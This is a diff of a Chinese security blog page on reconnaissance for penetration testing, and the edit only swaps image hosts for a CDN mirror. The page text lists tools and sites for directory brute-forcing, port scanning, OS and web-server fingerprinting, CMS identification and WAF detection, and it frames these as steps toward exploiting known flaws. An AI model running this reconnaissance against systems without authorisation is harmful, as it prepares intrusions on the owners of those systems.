     <a href="#37kbscan" class="header-mark"></a>3、7kbscan</h2><p>工具：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener noreferrer">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png" title="image-20240318224015520" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png" title="image-20240318224015520" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png">
         
     </a></p>
 <h2 id="4webrobot" class="headerLink">
@@ -1073,7 +1073,7 @@
 <p>查看80端口被哪个进程或程序占用：tasklist|findstr &ldquo;80&rdquo;</p>
 <p>结束该进程或程序：taskkill /f /t /im XX.exe</p>
 <h2 id="1各服务开启的默认端口以及攻击方向" class="headerLink">
-    <a href="#1%e5%90%84%e6%9c%8d%e5%8a%a1%e5%bc%80%e5%90%af%e7%9a%84%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bb%a5%e5%8f%8a%e6%94%bb%e5%87%bb%e6%96%b9%e5%90%91" class="header-mark"></a>1、各服务开启的默认端口以及攻击方向</h2><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png" title="image-20240318224051389" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png">
+    <a href="#1%e5%90%84%e6%9c%8d%e5%8a%a1%e5%bc%80%e5%90%af%e7%9a%84%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bb%a5%e5%8f%8a%e6%94%bb%e5%87%bb%e6%96%b9%e5%90%91" class="header-mark"></a>1、各服务开启的默认端口以及攻击方向</h2><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png" title="image-20240318224051389" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png">
         
     </a></p>
 <h2 id="2在线查询网站" class="headerLink">
@@ -1084,32 +1084,32 @@
 <h3 id="31nmapzmap" class="headerLink">
     <a href="#31nmapzmap" class="header-mark"></a>3.1、nmap(zmap)</h3><p>Nmap扫描中一些常见的服务</p>
 <p>msmq? ：默认对于的是1801端口，是 MSMQ Microsoft Message Queuing微软消息队列的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png" title="image-20240318224248649" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png" title="image-20240318224248649" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png" title="image-20240318224306226" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png" title="image-20240318224306226" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png">
         
     </a></p>
 <p>msrpc：Microsoft Remote Procedure Call微软远程过程调用，是 Windows 操作系统使用的一个协议。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png" title="image-20240318224314679" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png" title="image-20240318224314679" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png">
         
     </a></p>
 <p>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png" title="image-20240318224326847" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png" title="image-20240318224326847" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png">
         
     </a></p>
 <p>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2816d3017e53b6d30098486fd83178454deb36d9.png" title="image-20240318224341790" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-2816d3017e53b6d30098486fd83178454deb36d9.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2816d3017e53b6d30098486fd83178454deb36d9.png" title="image-20240318224341790" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-2816d3017e53b6d30098486fd83178454deb36d9.png">
         
     </a></p>
 <h3 id="32masscan" class="headerLink">
     <a href="#32masscan" class="header-mark"></a>3.2、masscan</h3><h3 id="33scanport" class="headerLink">
     <a href="#33scanport" class="header-mark"></a>3.3、ScanPort</h3><p>通过ping等方式获取网站IP，然后开始扫描</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png" title="image-20240318224425359" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png" title="image-20240318224425359" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png">
         
     </a></p>
 <h3 id="34webrobot" class="headerLink">
-    <a href="#34webrobot" class="header-mark"></a>3.4、webrobot</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png" title="image-20240318224438848" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png">
+    <a href="#34webrobot" class="header-mark"></a>3.4、webrobot</h3><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png" title="image-20240318224438848" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png">
         
     </a></p>
 <h2 id="七旁站c段" class="headerLink">
@@ -1124,7 +1124,7 @@
 <p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener noreferrer">https://dns.aizhan.com/</a></p>
 <p><a href="http://www.5kik.com/c/" target="_blank" rel="noopener noreferrer"><strong>http://www.5kik.com/c/</strong></a> <strong>？登不上</strong></p>
 <p><a href="https://webscan.cc/" target="_blank" rel="noopener noreferrer">https://webscan.cc/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-e279f958bb4899a484b3ce373980e5ec67533039.png" title="image-20240318224505782" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-e279f958bb4899a484b3ce373980e5ec67533039.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-e279f958bb4899a484b3ce373980e5ec67533039.png" title="image-20240318224505782" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-e279f958bb4899a484b3ce373980e5ec67533039.png">
         
     </a></p>
 <h3 id="12google-hackingbing" class="headerLink">
@@ -1147,11 +1147,11 @@
     <a href="#%e5%85%ab%e6%95%b4%e7%ab%99%e5%88%86%e6%9e%90" class="header-mark"></a>八、整站分析</h2><h2 id="1服务器类型" class="headerLink">
     <a href="#1%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%b1%bb%e5%9e%8b" class="header-mark"></a>1、服务器类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
 <p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png" title="image-20240318224523272" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png" title="image-20240318224523272" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png">
         
     </a></p>
 <p>而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png" title="image-20240318224542950" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png" title="image-20240318224542950" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png">
         
     </a></p>
 <p>检测服务器平台、版本等，获取后可以制定漏洞挖掘方案（如IIS6.0存在解析漏洞等）。</p>
@@ -1159,7 +1159,7 @@
 <p>区分大小写（页面报错）&ndash;Linux</p>
 <p>不区分大小写（页面正常）&ndash;Windows</p>
 <h3 id="11-云悉web资产梳理" class="headerLink">
-    <a href="#11-%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>1.1、 云悉WEB资产梳理</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png" title="image-20240318224635116" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png">
+    <a href="#11-%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>1.1、 云悉WEB资产梳理</h3><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png" title="image-20240318224635116" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png">
         
     </a></p>
 <p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">http://www.yunsee.cn/</a>，根据IIS版本判断Windows系统，系统对应版本通过搜索引擎查找。</p>
@@ -1168,7 +1168,7 @@
     <a href="#2%e7%bd%91%e7%ab%99%e5%ae%b9%e5%99%a8" class="header-mark"></a>2、网站容器</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
 <p>搭建网站的服务组件，例如：iis、Apache、nginx、tomcat等，通过网站容器判断存在的漏洞（如：Apache解析漏洞，nginx解析漏洞）。</p>
 <h3 id="21火狐渗透测试浏览器" class="headerLink">
-    <a href="#21%e7%81%ab%e7%8b%90%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e6%b5%8f%e8%a7%88%e5%99%a8" class="header-mark"></a>2.1、火狐渗透测试浏览器</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png" title="image-20240318224652100" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png">
+    <a href="#21%e7%81%ab%e7%8b%90%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e6%b5%8f%e8%a7%88%e5%99%a8" class="header-mark"></a>2.1、火狐渗透测试浏览器</h3><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png" title="image-20240318224652100" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png">
         
     </a></p>
 <h3 id="22云悉web资产梳理" class="headerLink">
@@ -1177,7 +1177,7 @@
 <p>1）可以根据网站URL来判断</p>
 <p>2）site:xxx filetype:php</p>
 <p>3）可以根据Firefox的插件来判断</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png" title="image-20240318224729502" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png" title="image-20240318224729502" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png">
         
     </a></p>
 <h3 id="31通过修改首页文件后缀查看页面响应判断" class="headerLink">
@@ -1191,27 +1191,27 @@
 <p>识别dedecms、phpcms、emlog、帝国cms等，通过网站使用的CMS找取该CMS已经公布的漏洞进行利用，进一步渗透网站。</p>
 <h3 id="41云悉指纹" class="headerLink">
     <a href="#41%e4%ba%91%e6%82%89%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.1、云悉指纹</h3><p><a href="https://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">https://www.yunsee.cn/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png" title="image-20240318224745687" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png" title="image-20240318224745687" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png">
         
     </a></p>
 <h3 id="42threatscan" class="headerLink">
     <a href="#42threatscan" class="header-mark"></a>4.2、ThreatScan</h3><p><a href="https://scan.top15.cn/web/" target="_blank" rel="noopener noreferrer">https://scan.top15.cn/web/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-039eb6b513752749827e5cb1921b6209396d953d.png" title="image-20240318224806210" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-039eb6b513752749827e5cb1921b6209396d953d.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-039eb6b513752749827e5cb1921b6209396d953d.png" title="image-20240318224806210" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-039eb6b513752749827e5cb1921b6209396d953d.png">
         
     </a></p>
 <h3 id="43wappalyzer" class="headerLink">
     <a href="#43wappalyzer" class="header-mark"></a>4.3、wappalyzer</h3><p><a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer">https://www.wappalyzer.com/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png" title="image-20240318224818148" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png" title="image-20240318224818148" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png">
         
     </a></p>
 <h3 id="44whatweb" class="headerLink">
     <a href="#44whatweb" class="header-mark"></a>4.4、WhatWeb</h3><p><a href="https://whatweb.net/" target="_blank" rel="noopener noreferrer">http://whatweb.net/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4917e9369baabdd749819b421843aa40762ffdd7.png" title="image-20240318224833360" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-4917e9369baabdd749819b421843aa40762ffdd7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4917e9369baabdd749819b421843aa40762ffdd7.png" title="image-20240318224833360" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-4917e9369baabdd749819b421843aa40762ffdd7.png">
         
     </a></p>
 <h3 id="45bugscaner" class="headerLink">
     <a href="#45bugscaner" class="header-mark"></a>4.5、BugScaner</h3><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener noreferrer">http://whatweb.bugscaner.com/</a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-11f6d51361219f0834c539d6696031840bb53fd2.png" title="image-20240318224842513" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-11f6d51361219f0834c539d6696031840bb53fd2.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-11f6d51361219f0834c539d6696031840bb53fd2.png" title="image-20240318224842513" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-11f6d51361219f0834c539d6696031840bb53fd2.png">
         
     </a></p>
 <h3 id="46潮汐指纹" class="headerLink">
@@ -1247,12 +1247,12 @@
 <p>命令：wafw00f -a 域名</p>
 <h3 id="61在线资产识别" class="headerLink">
